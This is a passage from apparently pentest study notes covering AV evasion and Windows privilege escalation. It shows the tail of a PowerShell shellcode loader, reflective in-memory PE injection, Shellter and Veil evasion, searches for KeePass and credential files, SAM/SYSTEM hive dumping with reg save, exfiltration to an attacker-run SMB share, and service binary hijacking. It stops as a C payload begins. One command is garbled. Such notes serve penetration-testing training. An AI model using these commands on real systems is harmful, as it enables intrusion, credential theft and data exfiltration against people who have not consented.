</span><span id="__span-64-11"><a id="__codelineno-64-11" name="__codelineno-64-11" href="#__codelineno-64-11"></a><span class="k">function</span> <span class="n">xf</span> <span class="p">{</span>
</span><span id="__span-64-12"><a id="__codelineno-64-12" name="__codelineno-64-12" href="#__codelineno-64-12"></a>        <span class="k">Param</span> <span class="p">(</span><span class="nv">$nfCl</span><span class="p">,</span> <span class="nv">$vf</span><span class="p">)</span>
</span><span id="__span-64-13"><a id="__codelineno-64-13" name="__codelineno-64-13" href="#__codelineno-64-13"></a>        <span class="nv">$uaQP</span> <span class="p">=</span> <span class="p">(</span><span class="no">[AppDomain]</span><span class="p">::</span><span class="n">CurrentDomain</span><span class="p">.</span><span class="n">GetAssemblies</span><span class="p">()</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">GlobalAssemblyCache</span> <span class="o">-And</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Location</span><span class="p">.</span><span class="n">Split</span><span class="p">(</span><span class="s1">&#39;\\&#39;</span><span class="p">)[-</span><span class="n">1</span><span class="p">].</span><span class="n">Equals</span><span class="p">(</span><span class="s1">&#39;System.dll&#39;</span><span class="p">)</span> <span class="p">}).</span><span class="n">GetType</span><span class="p">(</span><span class="s1">&#39;Microsoft.Win32.UnsafeNativeMethods&#39;</span><span class="p">)</span>
</span><span id="__span-64-14"><a id="__codelineno-64-14" name="__codelineno-64-14" href="#__codelineno-64-14"></a>
</span><span id="__span-64-15"><a id="__codelineno-64-15" name="__codelineno-64-15" href="#__codelineno-64-15"></a>        <span class="k">return</span> <span class="nv">$uaQP</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s1">&#39;GetProcAddress&#39;</span><span class="p">,</span> <span class="no">[Type[]]</span><span class="p">@(</span><span class="no">[System.Runtime.InteropServices.HandleRef], [String]</span><span class="p">)).</span><span class="n">Invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span> <span class="p">@(</span><span class="no">[System.Runtime.InteropServices.HandleRef]</span><span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Runtime</span><span class="p">.</span><span class="n">InteropServices</span><span class="p">.</span><span class="n">HandleRef</span><span class="p">((</span><span class="nb">New-Object</span> <span class="n">IntPtr</span><span class="p">),</span> <span class="p">(</span><span class="nv">$uaQP</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s1">&#39;GetModuleHandle&#39;</span><span class="p">)).</span><span class="n">Invoke</span><span class="p">(</span><span class="nv">$null</span><span class="p">,</span> <span class="p">@(</span><span class="nv">$nfCl</span><span class="p">)))),</span> <span class="nv">$vf</span><span class="p">))</span>
</span><span id="__span-64-16"><a id="__codelineno-64-16" name="__codelineno-64-16" href="#__codelineno-64-16"></a><span class="p">}</span>
</span><span id="__span-64-17"><a id="__codelineno-64-17" name="__codelineno-64-17" href="#__codelineno-64-17"></a>
</span><span id="__span-64-18"><a id="__codelineno-64-18" name="__codelineno-64-18" href="#__codelineno-64-18"></a><span class="k">function</span> <span class="n">xb</span> <span class="p">{</span>
</span><span id="__span-64-19"><a id="__codelineno-64-19" name="__codelineno-64-19" href="#__codelineno-64-19"></a>        <span class="k">Param</span> <span class="p">(</span>
</span><span id="__span-64-20"><a id="__codelineno-64-20" name="__codelineno-64-20" href="#__codelineno-64-20"></a>                <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">0</span><span class="p">,</span> <span class="k">Mandatory</span> <span class="p">=</span> <span class="nv">$True</span><span class="p">)]</span> <span class="no">[Type[]]</span> <span class="nv">$jGN_b</span><span class="p">,</span>
</span><span id="__span-64-21"><a id="__codelineno-64-21" name="__codelineno-64-21" href="#__codelineno-64-21"></a>                <span class="p">[</span><span class="k">Parameter</span><span class="p">(</span><span class="k">Position</span> <span class="p">=</span> <span class="n">1</span><span class="p">)]</span> <span class="no">[Type]</span> <span class="nv">$hh</span> <span class="p">=</span> <span class="no">[Void]</span>
</span><span id="__span-64-22"><a id="__codelineno-64-22" name="__codelineno-64-22" href="#__codelineno-64-22"></a>        <span class="p">)</span>
</span><span id="__span-64-23"><a id="__codelineno-64-23" name="__codelineno-64-23" href="#__codelineno-64-23"></a><span class="p">...</span>
</span></code></pre></div>
<p><strong><em>Run the Malicious Script</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a><span class="nb">Set-ExecutionPolicy</span> <span class="n">Unrestricted</span> <span class="n">-Scope</span> <span class="n">CurrentUser</span>
</span><span id="__span-65-2"><a id="__codelineno-65-2" name="__codelineno-65-2" href="#__codelineno-65-2"></a>
</span><span id="__span-65-3"><a id="__codelineno-65-3" name="__codelineno-65-3" href="#__codelineno-65-3"></a><span class="p">./</span><span class="n">malicious</span><span class="p">.</span><span class="n">ps1</span>
</span></code></pre></div>
<p><strong><em>Run the DLL/EXE in memory using a</em> ReflectivePEInjection.ps1 </strong>**</p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a><span class="c">## Your base64 encoded binary</span>
</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>
</span><span id="__span-66-3"><a id="__codelineno-66-3" name="__codelineno-66-3" href="#__codelineno-66-3"></a><span class="nv">$InputString</span> <span class="p">=</span> <span class="s1">&#39;...........&#39;</span>
</span><span id="__span-66-4"><a id="__codelineno-66-4" name="__codelineno-66-4" href="#__codelineno-66-4"></a>
</span><span id="__span-66-5"><a id="__codelineno-66-5" name="__codelineno-66-5" href="#__codelineno-66-5"></a><span class="k">function</span> <span class="nb">Invoke-ReflectivePEInjection</span>
</span><span id="__span-66-6"><a id="__codelineno-66-6" name="__codelineno-66-6" href="#__codelineno-66-6"></a>
</span><span id="__span-66-7"><a id="__codelineno-66-7" name="__codelineno-66-7" href="#__codelineno-66-7"></a><span class="p">{</span>
</span><span id="__span-66-8"><a id="__codelineno-66-8" name="__codelineno-66-8" href="#__codelineno-66-8"></a>
</span><span id="__span-66-9"><a id="__codelineno-66-9" name="__codelineno-66-9" href="#__codelineno-66-9"></a>   <span class="p">......</span>
</span><span id="__span-66-10"><a id="__codelineno-66-10" name="__codelineno-66-10" href="#__codelineno-66-10"></a>   <span class="p">......</span>
</span><span id="__span-66-11"><a id="__codelineno-66-11" name="__codelineno-66-11" href="#__codelineno-66-11"></a>   <span class="p">......</span>
</span><span id="__span-66-12"><a id="__codelineno-66-12" name="__codelineno-66-12" href="#__codelineno-66-12"></a>
</span><span id="__span-66-13"><a id="__codelineno-66-13" name="__codelineno-66-13" href="#__codelineno-66-13"></a><span class="p">}</span>
</span><span id="__span-66-14"><a id="__codelineno-66-14" name="__codelineno-66-14" href="#__codelineno-66-14"></a>
</span><span id="__span-66-15"><a id="__codelineno-66-15" name="__codelineno-66-15" href="#__codelineno-66-15"></a><span class="c">## Convert base64 string to byte array</span>
</span><span id="__span-66-16"><a id="__codelineno-66-16" name="__codelineno-66-16" href="#__codelineno-66-16"></a>
</span><span id="__span-66-17"><a id="__codelineno-66-17" name="__codelineno-66-17" href="#__codelineno-66-17"></a><span class="nv">$PEBytes</span> <span class="p">=</span> <span class="no">[System.Convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$InputString</span><span class="p">)</span>
</span><span id="__span-66-18"><a id="__codelineno-66-18" name="__codelineno-66-18" href="#__codelineno-66-18"></a>
</span><span id="__span-66-19"><a id="__codelineno-66-19" name="__codelineno-66-19" href="#__codelineno-66-19"></a><span class="c">## Run EXE in memory</span>
</span><span id="__span-66-20"><a id="__codelineno-66-20" name="__codelineno-66-20" href="#__codelineno-66-20"></a>
</span><span id="__span-66-21"><a id="__codelineno-66-21" name="__codelineno-66-21" href="#__codelineno-66-21"></a><span class="nb">Invoke-ReflectivePEInjection</span> <span class="n">-PEBytes</span> <span class="nv">$PEBytes</span> <span class="n">-ExeArgs</span> <span class="s2">&quot;Arg1 Arg2 Arg3 Arg4&quot;</span>
</span></code></pre></div>
<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1</a></p>
<h3 id="automating-the-process"><strong>Automating the Process</strong></h3>
<p><strong><em>Install <a href="https://www.shellterproject.com/">Shellter</a></em></strong> </p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>apt-cache<span class="w"> </span>search<span class="w"> </span>shellter
</span><span id="__span-67-2"><a id="__codelineno-67-2" name="__codelineno-67-2" href="#__codelineno-67-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>shellter
</span><span id="__span-67-3"><a id="__codelineno-67-3" name="__codelineno-67-3" href="#__codelineno-67-3"></a>
</span><span id="__span-67-4"><a id="__codelineno-67-4" name="__codelineno-67-4" href="#__codelineno-67-4"></a><span class="c1">## Since Shellter is designed to be run on Windows operating systems, install wine</span>
</span><span id="__span-67-5"><a id="__codelineno-67-5" name="__codelineno-67-5" href="#__codelineno-67-5"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>wine
</span><span id="__span-67-6"><a id="__codelineno-67-6" name="__codelineno-67-6" href="#__codelineno-67-6"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>--add-architecture<span class="w"> </span>i386<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>wine32
</span><span id="__span-67-7"><a id="__codelineno-67-7" name="__codelineno-67-7" href="#__codelineno-67-7"></a>
</span><span id="__span-67-8"><a id="__codelineno-67-8" name="__codelineno-67-8" href="#__codelineno-67-8"></a><span class="c1">## Insall Wine on ARM based system</span>
</span><span id="__span-67-9"><a id="__codelineno-67-9" name="__codelineno-67-9" href="#__codelineno-67-9"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>wine
</span><span id="__span-67-10"><a id="__codelineno-67-10" name="__codelineno-67-10" href="#__codelineno-67-10"></a>sudo<span class="w"> </span>dpkg<span class="w"> </span>--add-architecture<span class="w"> </span>amd64
</span><span id="__span-67-11"><a id="__codelineno-67-11" name="__codelineno-67-11" href="#__codelineno-67-11"></a>sudo<span class="w">  </span>apt<span class="w"> </span>install<span class="w"> </span>-y<span class="w"> </span>qemu-user-static<span class="w"> </span>binfmt-support
</span><span id="__span-67-12"><a id="__codelineno-67-12" name="__codelineno-67-12" href="#__codelineno-67-12"></a>sudo<span class="w"> </span>apt-get<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>apt-get<span class="w"> </span>install<span class="w"> </span>wine32
</span></code></pre></div>
<aside>


For real engagements, it is best practice to pick a new, less scrutinized application as Shellter's [author explains](https://www.shellterproject.com/an-important-tip-for-shellter-usage/).

</aside>

<p><strong><em>Veil Framework</em></strong></p>
<p><a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
<p><strong><em>Advanced Techniques to Bypass AV detection</em></strong></p>
<p><a href="https://web.archive.org/web/20210317102554/https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf">web.archive.org</a></p>
<p><strong><em>FunFisher Malware Analysis</em></strong></p>
<p><a href="https://www.microsoft.com/en-us/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/">FinFisher exposed: A researchers tale of defeating traps, tricks, and complex virtual machines | Microsoft Security Blog</a></p>
<p><strong><em>AD Evasion Resources</em></strong></p>
<p><a href="https://www.ired.team/offensive-security/defense-evasion/av-bypass-with-metasploit-templates">AV Bypass with Metasploit Templates and Custom Binaries | Red Team Notes</a></p>
<hr />
<h2 id="windows-privilege-escalation"><strong>Windows Privilege Escalation</strong></h2>
<h3 id="enumerating-windows"><strong>Enumerating Windows</strong></h3>
<h4 id="understanding-windows-privileges-and-access-control-mechanisms"><strong>Understanding Windows Privileges and Access Control Mechanisms</strong></h4>
<p><strong><em>Well-known SIDs</em></strong></p>
<div class="language-bash highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>S-1-0-0<span class="w">                       </span>Nobody<span class="w">        </span>
</span><span id="__span-68-2"><a id="__codelineno-68-2" name="__codelineno-68-2" href="#__codelineno-68-2"></a>S-1-1-0<span class="w">                       </span>Everybody
</span><span id="__span-68-3"><a id="__codelineno-68-3" name="__codelineno-68-3" href="#__codelineno-68-3"></a>S-1-5-11<span class="w">                      </span>Authenticated<span class="w"> </span>Users
</span><span id="__span-68-4"><a id="__codelineno-68-4" name="__codelineno-68-4" href="#__codelineno-68-4"></a>S-1-5-18<span class="w">                      </span>Local<span class="w"> </span>System
</span><span id="__span-68-5"><a id="__codelineno-68-5" name="__codelineno-68-5" href="#__codelineno-68-5"></a>S-1-5-domainidentifier-500<span class="w">    </span>Administrator
</span></code></pre></div>
<p>From Windows Vista onward, processes run on five <a href="https://msdn.microsoft.com/en-us/library/bb625963.aspx"><em>integrity levels</em></a>:</p>
<ul>
<li>System  Highly trusted user-mode system processes (e.g., <code>Winlogon</code>, <code>LSASS</code>)</li>
<li>High  For elevated processes running with admin privileges</li>
<li>Medium  For standard user processes (default)</li>
<li>Low  For sandboxed or restricted processes (e.g., browsers)</li>
<li>Untrusted  Rarely used; for highly restricted unverified sources</li>
</ul>
<h4 id="situational-awareness"><strong>Situational Awareness</strong></h4>
<p><strong><em>There are several key pieces of information we should always obtain:</em></strong></p>
<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>- Username and hostname
</span><span id="__span-69-2"><a id="__codelineno-69-2" name="__codelineno-69-2" href="#__codelineno-69-2"></a>- Group memberships of the current user
</span><span id="__span-69-3"><a id="__codelineno-69-3" name="__codelineno-69-3" href="#__codelineno-69-3"></a>- Existing users and groups
</span><span id="__span-69-4"><a id="__codelineno-69-4" name="__codelineno-69-4" href="#__codelineno-69-4"></a>- Operating system, version and architecture
</span><span id="__span-69-5"><a id="__codelineno-69-5" name="__codelineno-69-5" href="#__codelineno-69-5"></a>- Network information
</span><span id="__span-69-6"><a id="__codelineno-69-6" name="__codelineno-69-6" href="#__codelineno-69-6"></a>- Installed applications
</span><span id="__span-69-7"><a id="__codelineno-69-7" name="__codelineno-69-7" href="#__codelineno-69-7"></a>- Running processes
</span></code></pre></div>
<p><strong><em>Groups/Users enumeration</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a><span class="gu">## Group membership of the user</span>
</span><span id="__span-70-2"><a id="__codelineno-70-2" name="__codelineno-70-2" href="#__codelineno-70-2"></a>whoami /groups
</span><span id="__span-70-3"><a id="__codelineno-70-3" name="__codelineno-70-3" href="#__codelineno-70-3"></a>net user [user]
</span><span id="__span-70-4"><a id="__codelineno-70-4" name="__codelineno-70-4" href="#__codelineno-70-4"></a>
</span><span id="__span-70-5"><a id="__codelineno-70-5" name="__codelineno-70-5" href="#__codelineno-70-5"></a><span class="gu">## List of local users</span>
</span><span id="__span-70-6"><a id="__codelineno-70-6" name="__codelineno-70-6" href="#__codelineno-70-6"></a>Get-LocalUser
</span><span id="__span-70-7"><a id="__codelineno-70-7" name="__codelineno-70-7" href="#__codelineno-70-7"></a>net user
</span><span id="__span-70-8"><a id="__codelineno-70-8" name="__codelineno-70-8" href="#__codelineno-70-8"></a>
</span><span id="__span-70-9"><a id="__codelineno-70-9" name="__codelineno-70-9" href="#__codelineno-70-9"></a><span class="gu">## List of local groups</span>
</span><span id="__span-70-10"><a id="__codelineno-70-10" name="__codelineno-70-10" href="#__codelineno-70-10"></a>Get-LocalGroup
</span><span id="__span-70-11"><a id="__codelineno-70-11" name="__codelineno-70-11" href="#__codelineno-70-11"></a>net localgroup
</span><span id="__span-70-12"><a id="__codelineno-70-12" name="__codelineno-70-12" href="#__codelineno-70-12"></a>
</span><span id="__span-70-13"><a id="__codelineno-70-13" name="__codelineno-70-13" href="#__codelineno-70-13"></a><span class="gu">## List member of local groups</span>
</span><span id="__span-70-14"><a id="__codelineno-70-14" name="__codelineno-70-14" href="#__codelineno-70-14"></a>Get-LocalGroupMember [group]
</span><span id="__span-70-15"><a id="__codelineno-70-15" name="__codelineno-70-15" href="#__codelineno-70-15"></a>net localgroup [group]
</span></code></pre></div>
<p><strong><em>System Information</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a><span class="n">systeminfo</span>
</span></code></pre></div>
<p><strong><em>Network Information</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a><span class="gu">## Network interfaces</span>
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>ipconfig /all
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a><span class="gu">## Display routing table</span>
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>route print
</span><span id="__span-72-6"><a id="__codelineno-72-6" name="__codelineno-72-6" href="#__codelineno-72-6"></a>
</span><span id="__span-72-7"><a id="__codelineno-72-7" name="__codelineno-72-7" href="#__codelineno-72-7"></a><span class="gu">## list of all active network connections </span>
</span><span id="__span-72-8"><a id="__codelineno-72-8" name="__codelineno-72-8" href="#__codelineno-72-8"></a>netstat -ano
</span></code></pre></div>
<p><strong><em>List 32bit Applications</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a><span class="nb">Get-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></code></pre></div>
<p><strong><em>List 64bit Applications</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a><span class="nb">Get-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displayname</span>
</span></code></pre></div>
<aside>


we should always check 32-bit and 64-bit **Program Files** directories located in **C:\**.
Additionally, we should review the contents of the **Downloads** directory of our user to find more potential programs.

</aside>

<p><strong><em>List running Applications/Processes</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a><span class="nb">Get-ProGet</span><span class="n">-ItemProperty</span> <span class="s2">&quot;HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&quot;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">displaynamecess</span>
</span></code></pre></div>
<h4 id="hidden-in-plain-view"><strong>Hidden in Plain View</strong></h4>
<p><strong><em>Search KeePass Database</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">kdbx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></code></pre></div>
<p><strong><em>Search sensitive information of XAMPP</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">xampp</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">ini</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></code></pre></div>
<p><strong><em>Search documents and text files in the Home directory</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a><span class="nb">Get-ChildItem</span> <span class="n">-Path</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span> <span class="n">-Include</span> <span class="p">*.</span><span class="n">txt</span><span class="p">,*.</span><span class="n">pdf</span><span class="p">,*.</span><span class="n">csv</span><span class="p">,*.</span><span class="n">xls</span><span class="p">,*.</span><span class="n">xlsx</span><span class="p">,*.</span><span class="n">doc</span><span class="p">,*.</span><span class="n">docx</span> <span class="o">-File</span> <span class="n">-Recurse</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span>
</span></code></pre></div>
<p><strong><em>RunAs Command - Only if GUI access</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a><span class="n">runas</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="no">[user]</span> <span class="n">cmd</span>
</span></code></pre></div>
<h4 id="information-goldmine-powershell"><strong>Information Goldmine PowerShell</strong></h4>
<p><strong><em>PowerShell - Get History</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a><span class="nb">Get-History</span>
</span></code></pre></div>
<p><strong><em>PowerShell - Get PSReadLine Path</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a><span class="p">(</span><span class="nb">Get-PSReadlineOption</span><span class="p">).</span><span class="n">HistorySavePath</span>
</span></code></pre></div>
<p><strong><em>PowerShell - Enter-PSSession</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s2">&quot;password123!&quot;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s2">&quot;user&quot;</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="no">[hostname]</span> <span class="n">-Credential</span> <span class="nv">$cred</span>
</span></code></pre></div>
<p><strong><em>Search events recorded by Script Block Logging</em></strong></p>
<div class="language-markdown highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#__codelineno-83-1"></a><span class="gu">## Open Event Viewer</span>
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#__codelineno-83-2"></a><span class="gu">## Navigate to Applications and Services Logs  Microsoft  Windows  PowerShell  Operational</span>
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#__codelineno-83-3"></a><span class="gu">## Filter for Script Block Logging events to 4104 ID</span>
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#__codelineno-83-4"></a><span class="gu">## View events. Note ScriptBlockText parameter where executed scripts are stored</span>
</span></code></pre></div>
<p><strong>Dumping Hashes from SAM via Registry</strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#__codelineno-84-1"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">system</span> <span class="n">system</span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#__codelineno-84-2"></a><span class="n">reg</span> <span class="n">save</span> <span class="n">hklm</span><span class="p">\</span><span class="n">sam</span> <span class="n">sam</span>
</span></code></pre></div>
<p><strong>Exfiltrate Data From Windows</strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#__codelineno-85-1"></a><span class="c">## Kali </span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#__codelineno-85-2"></a><span class="n">impacket-smbserver</span> <span class="n">share</span> <span class="p">.</span> <span class="n">-smb2support</span> <span class="n">-username</span> <span class="n">user</span> <span class="n">-password</span> <span class="n">password</span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#__codelineno-85-3"></a>
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#__codelineno-85-4"></a><span class="c">## Windows</span>
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#__codelineno-85-5"></a>
</span><span id="__span-85-6"><a id="__codelineno-85-6" name="__codelineno-85-6" href="#__codelineno-85-6"></a><span class="n">net</span> <span class="n">use</span> <span class="n">m</span><span class="p">:</span> <span class="p">\\</span><span class="no">[IP]</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">user</span> <span class="n">password</span>
</span><span id="__span-85-7"><a id="__codelineno-85-7" name="__codelineno-85-7" href="#__codelineno-85-7"></a><span class="nb">copy </span><span class="n">data</span> <span class="n">m</span><span class="p">:\</span>
</span></code></pre></div>
<h4 id="automated-enumeration"><strong>Automated Enumeration</strong></h4>
<p><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">PEASS-ng/winPEAS at master  peass-ng/PEASS-ng</a></p>
<p><a href="https://github.com/GhostPack/Seatbelt">https://github.com/GhostPack/Seatbelt</a></p>
<p><a href="https://github.com/411Hall/JAWS">https://github.com/411Hall/JAWS</a></p>
<h3 id="leveraging-windows-services"><strong>Leveraging Windows Services</strong></h3>
<h4 id="service-binary-hijacking"><strong>Service Binary Hijacking</strong></h4>
<p><strong><em>List Running Services</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#__codelineno-86-1"></a><span class="nb">Get-CimInstance</span> <span class="n">-ClassName</span> <span class="n">win32_service</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Name</span><span class="p">,</span><span class="n">State</span><span class="p">,</span><span class="n">PathName</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">State</span> <span class="o">-like</span> <span class="s1">&#39;Running&#39;</span><span class="p">}</span>
</span></code></pre></div>
<p><strong><em>Check Permissions of Vulnerable Service Binary</em></strong></p>
<div class="language-powershell highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#__codelineno-87-1"></a><span class="n">icacls</span> <span class="s2">&quot;C:\xampp\mysql\bin\mysqld.exe&quot;</span>
</span></code></pre></div>
<p><strong><em>Icacls Permissions</em></strong></p>
<table>
<thead>
<tr>
<th>Mask</th>
<th>Permissions</th>
</tr>
</thead>
<tbody>
<tr>
<td>F</td>
<td>Full access</td>
</tr>
<tr>
<td>M</td>
<td>Modify access</td>
</tr>
<tr>
<td>RX</td>
<td>Read and execute access</td>
</tr>
<tr>
<td>R</td>
<td>Read-only access</td>
</tr>
<tr>
<td>W</td>
<td>Write-only access</td>
</tr>
</tbody>
</table>
<p><strong><em>Abuse the Vulnerable Service Binary - C code example</em></strong></p>
<div class="language-c highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#__codelineno-88-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
</span><span id="__span-88-2"><a id="__codelineno-88-2" name="__codelineno-88-2" href="#__codelineno-88-2"></a>
</span><span id="__span-88-3"><a id="__codelineno-88-3" name="__codelineno-88-3" href="#__codelineno-88-3"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="w"> </span><span class="p">()</span>
</span><span id="__span-88-4"><a id="__codelineno-88-4" name="__codelineno-88-4" href="#__codelineno-88-4"></a><span class="p">{</span>
